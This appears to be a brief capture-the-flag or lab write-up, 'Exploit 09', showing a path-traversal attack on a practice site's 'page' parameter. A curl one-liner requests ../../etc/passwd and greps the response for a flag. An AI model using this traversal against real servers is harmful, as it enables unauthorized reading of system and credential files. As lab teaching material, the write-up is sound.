# Exploit 09 - relative path

On the website routing is handled by the _page_ query parameter. We can try inserting relative paths to parent directories to find config files on the server.

```bash
curl -s -X GET "http://192.168.56.101/index.php?page=../../../../../../../../../etc/passwd" | grep -oP 'The flag is : \K[0-9a-f]{64}'
```
